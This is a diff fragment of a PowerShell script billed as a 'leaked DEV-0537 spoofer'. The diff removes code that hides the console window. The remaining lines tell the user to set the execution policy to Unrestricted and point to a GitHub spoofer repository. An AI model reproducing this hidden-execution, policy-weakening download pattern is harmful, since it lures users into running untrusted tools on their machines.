@@ -1,12 +1,3 @@
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0)
-
 #Leaked DEV-0537 spoofer :)
 # Make sure to paste Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser inside of powershell or thing's get a lil funni
 $url = "https://github.com/SecHex/SecHex-Spoofy" 
